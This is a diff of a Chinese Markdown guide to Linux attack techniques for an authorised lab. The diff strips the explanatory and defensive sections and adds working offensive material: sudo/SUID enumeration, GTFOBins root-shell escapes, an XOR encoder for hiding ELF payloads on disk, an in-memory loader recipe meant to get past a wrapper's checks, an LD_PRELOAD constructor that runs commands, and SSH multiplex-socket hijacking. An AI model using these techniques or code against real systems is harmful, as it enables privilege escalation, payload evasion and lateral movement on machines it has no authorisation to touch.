@@ -1,65 +1,81 @@
 # Linux
 
-Linux 实验的防御面主要是文件扫描、SUID/sudo、动态链接加载顺序、以及「已有信任上下文」被复用。不要把 Windows 的 AMSI / 反射加载思路硬搬过来。
+::: warning 仅供学习 / 授权实验
+编码 loader 和共享库只在你的 lab 里对授权目标用。
+:::
 
-## 被包装脚本执行的 ELF
-
-有的上传点会跑你的 ELF，但要求：打印特定输出、活够一段时间、或以 0 退出。直接传一个立刻退出的反向连接程序，会被包装器判失败。
-
-处理原则：
-
-- 主进程满足业务检查（输出、生命周期）
-- 真正的实验逻辑放在子进程或异步，且尽量不在磁盘上留明文
-- 先读包装脚本再写程序，不要猜横幅
-
-编码 / 内存加载可以自己写练习，本站不提供现成 loader。先用无害程序（只打印横幅、sleep、exit 0）证明包装器满意。
-
-## 共享库
-
-| 机制 | 何时成立 |
-|---|---|
-| `LD_PRELOAD` | 你能影响目标进程的环境变量，且程序不是安全-setuid 到忽略它 |
-| `LD_LIBRARY_PATH` | 程序用裸名加载 `.so`，且你能控制搜索路径上的文件 |
-
-导出符号必须对上，否则进程起不来或功能坏掉。和 Windows Proxy DLL 同一类问题：先做「只转发 / 只 hook 一个无害函数打日志」的对照。
-
-## sudo 只放行一个程序
+## sudo / SUID
 
 ```bash
 sudo -l
+find / -perm -4000 2>/dev/null
+getcap -r / 2>/dev/null
 ```
 
-然后打开 [GTFOBins](https://gtfobins.github.io/) 查那个具体二进制。`vim`、`find`、`less`、`env` 的条目都是公开的。实验里只使用清单里出现的程序，不要假设有一个万能 sudo。
-
-## 制品库
-
-你能写制品仓库（Artifactory / Nexus 等），但不能登录随后下载并执行该制品的机器。这是供应链问题：替换的文件要**保持业务行为**，否则消费端会拒绝部署。先在本地用同样架构、同样接口做对照，再覆盖远程制品，并准备回滚。
-
-## SSH 复用连接
-
-没有密码，但磁盘上有 ControlMaster 套接字或转发的 agent：
+对照 [GTFOBins](https://gtfobins.github.io/)：
 
 ```bash
-ls -l ~/.ssh/
-# ControlPath 常见于 /tmp/ssh-* 或用户配置的路径
-ssh -S /path/to/mux -O check dummy
+sudo vim -c ':!/bin/sh'
+sudo find /etc/passwd -exec /bin/sh \;
+sudo less /etc/profile
+# 然后 !sh
 ```
 
-套接字意味着**已经认证过的复用连接**。授权范围内可以用来跳到同一 multiplex 允许的主机。不要在报告里写「破解了 SSH」，这是会话复用。
+## XOR 编码（磁盘不留明文 ELF）
 
-Agent forwarding 同样：你用的是别人已解锁的钥匙，而不是你有口令。
+```python
+#!/usr/bin/env python3
+import argparse, sys
+def parse_key(t):
+    return [int(p, 0) if p.lower().startswith("0x") else int(p) for p in t.split(",")]
+def xor_bytes(data, keys):
+    return bytes(b ^ keys[i % len(keys)] for i, b in enumerate(data))
+ap = argparse.ArgumentParser()
+ap.add_argument("-i", required=True); ap.add_argument("-o")
+ap.add_argument("-k", default="0xfa"); ap.add_argument("--c-array", action="store_true")
+ap.add_argument("-d", action="store_true")
+a = ap.parse_args()
+keys = parse_key(a.k)
+data = open(a.i, "rb").read()
+out = xor_bytes(data, keys)
+if a.c_array:
+    print("unsigned char enc[] = {" + ", ".join(f"0x{b:02X}" for b in out) + "};")
+else:
+    open(a.o or "out.enc", "wb").write(out)
+```
 
-## 失败分类
+Loader 思路：mmap 密文 → XOR → mprotect PROT_EXEC → 跳进去。主进程同时打印业务横幅 / sleep，好过包装器检查。
 
-| 现象 | 先查 |
-|---|---|
-| 上传的 ELF 立刻被删 | 文件扫描；先过业务检查的无害版 |
-| 程序起来但没你的逻辑 | 符号 / 加载路径 / setuid 忽略 LD_PRELOAD |
-| sudo 条目在 GTFOBins 上却失败 | 版本、参数被包一层、noexec 挂载 |
+## LD_PRELOAD / LD_LIBRARY_PATH
 
-## 防御侧
+```c
+/* gcc -shared -fPIC -o /tmp/x.so x.c */
+#include <stdlib.h>
+#include <unistd.h>
+void __attribute__((constructor)) init(void) {
+    unsetenv("LD_PRELOAD");
+    system("id > /tmp/pwned");
+}
+```
 
-- sudo 精确到参数；`NOEXEC`；不要给编辑器 root
-- 制品签名与校验
-- 禁 SSH agent forwarding；ControlMaster 套接字权限
-- setuid 程序自己处理库搜索路径
+```bash
+LD_PRELOAD=/tmp/x.so /usr/bin/target
+LD_LIBRARY_PATH=/tmp /usr/bin/target   # 库文件名必须对上 ldd 里的裸名
+ldd /usr/bin/target
+LD_DEBUG=libs /usr/bin/target 2>&1 | head
+```
+
+setuid 程序常忽略 `LD_PRELOAD`。
+
+## SSH 复用
+
+```bash
+ls -l ~/.ssh/ /tmp/ssh-* 2>/dev/null
+ssh -S /path/to/mux -O check dummy
+ssh -S /path/to/mux user@next-hop
+ssh-add -l
+```
+
+## 制品替换
+
+覆盖前对齐架构、文件名、业务输出，保留回滚副本。
